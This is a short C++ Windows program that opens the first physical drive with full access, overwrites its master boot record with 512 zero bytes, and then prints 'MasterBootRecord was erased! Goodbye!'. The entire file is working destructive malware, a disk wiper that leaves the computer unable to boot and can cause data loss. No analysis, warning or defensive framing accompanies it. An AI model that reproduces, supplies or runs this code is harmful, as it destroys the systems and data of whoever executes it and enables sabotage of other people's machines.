﻿#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512

int main()
{
	DWORD write;

	char mbr[MBR_SIZE];

	ZeroMemory(&mbr, (sizeof mbr));

	HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (WriteFile(MasterBootRecord, mbr, MBR_SIZE, &write, NULL) == TRUE)
	{
		cout << "MasterBootRecord was erased! Goodbye!" << endl;

		Sleep(3000);

		ExitProcess(0);
	}
	else
	{
		cout << "Not Bad!" << endl;

		Sleep(3000);

		ExitProcess(0);
	}

	CloseHandle(MasterBootRecord);

	return 0;
}